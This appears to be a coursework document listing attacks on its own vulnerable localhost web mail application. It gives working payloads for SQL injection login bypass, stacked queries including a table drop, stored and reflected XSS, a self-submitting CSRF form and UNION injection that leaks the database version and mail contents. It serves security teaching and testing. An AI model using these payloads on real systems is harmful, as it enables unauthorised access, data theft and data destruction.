# List of possible attacks

## SQL Injection

Unlocks: Get access without password.

On login, enter `<USERNAME>' --` as email, where `<USERNAME>` is the target username.
Enter as password any value. 
The 
resulting query:
```sql
SELECT * FROM [user] WHERE email='<USERNAME>' --' AND password='any'
```

Works, because the password is checked after the email and the input is not sanitized.

## SQL Injection

Unlocks: Run any SQL statement.

On login, enter `'; <SQL_STATEMENT> --` as email, where `<SQL_STATEMENT>` is any SQL statement, like `'; drop table [mail]; --` for 
example.
The resulting query:
```sql
SELECT * FROM [user] WHERE email=''; <SQL_STATEMENT>'
```

## Stored XSS

Unlocks: Run any JavaScript code on sender and receiver of email.

Once logged in, email an existing user with `<script>console.log("pwned");</script>` as the subject or the body of the email.
The resulting query:
```sql
INSERT INTO mail ( sender, receiver, subject, body, [time] )
VALUES ( '<sender>', '<receiver>', '<script>console.log("pwned subject");</script>', '<script>console.log("pwned body");</script>', '<timestamp>' )
```
`<sender>` and `<received>` can be any accepted value.
`<timestamp>` is auto-generated.

When emails are queried in a second moment, subject and body are read from the DB and directly embedded into the 
HTML that is sent, running the JavaScript code each time. This hold for the sender when visiting the page of sent emails
and for the receiver when visiting the inbox page.

_Note: It is important that the script does not use single quotes, because the SQL query uses single quotes already.
If the SQL query uses double quotes, then the script must use single quotes exclusively._

## Reflected XSS

On registration, pass `<script>console.log("pwned");</script>` as the email to run the script on the victim's browser.

This is equivalent to making a POST request to the following URL:
```
http://localhost:8080/exam-project/RegisterServlet?name=Name1&surname=Surname1&email=%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E&password=123
```
This URL can be used for a XSRF attack, like shown below.

_Note: The email can be at most 50 characters long due the limit imposed by the database. 
Using a longer string throws an exception on the server and does not return the script in the response._

## Reflected XSS

Feature: Run any JavaScript code.

On registration, enter a valid email and `"><script>console.log("pwned");</script>` as password to run the script on the victim's browser.

This is equivalent to making a POST request to the following URL:
```
http://localhost:8080/exam-project/RegisterServlet?name=Name3&surname=Surname3&email=user3%40gmail.com&password=%22%3E%3Cscript%3Econsole.log%28%22pwned%22%29%3B%3C%2Fscript%3E
```
This URL can be used for a XSRF attack, like shown below.

The email check is disabled, because the responsible query is compiled to:
```sql
SELECT * FROM [user] WHERE email=''; --'
```
The password is not treated and embedded in the response, resulting in the execution of the script in the victim's browser.

_Note: The password can be at most 50 characters long due the limit imposed by the database.
Using a longer string throws an exception on the server and does not return the script in the response._

## XSRF

The following HTML page can be forged, such that the session cookie of the victim visiting the page is used to authenticate the sending of an arbitrary email.
In this example `user1@gmail.com` is forced to email `user2@gmail.com`.
```html
<form id="submitMail" class="form-resize" action="http://localhost:8080/exam-project/SendMailServlet"
      method="post">
    <input type="hidden" name="sender" value="user1@gmail.com">
    <input class="hidden" name="receiver" placeholder="Receiver" required="" value="user2@gmail.com">
    <input class="hidden" name="subject" placeholder="Subject" required="" value="PWNED">
    <input class="hidden" name="body" placeholder="Body" required="" value="Forced message">
</form>
<script>document.forms.submitMail.submit();</script>
```

_Note: The sender does not have to be the owner of the cookie used to authenticate the request._

## In-band SQL Injection

On login, pass `user1@gmail.com' UNION SELECT CURRENT_USER, CURRENT_USER, @@VERSION, CURRENT_USER --` as email to receive a verbose description of the database version and the name of the current database user.

_Note: 4 expressions are used in the select statement, because the user table has 4 columns too. 
Only the 3rd and the 4th expression are then extracted and returned by the web server._

## In-band SQL Injection

Assume that we know the structure of the database tables.

On login, pass `' UNION SELECT subject, subject, subject, receiver FROM mail --` as email to receive 
the subject and the receiver of the first email returned by the database.

_Note: 4 expressions are used in the select statement, because the user table has 4 columns too. 
Only the 3rd and the 4th expression are then extracted and returned by the web server._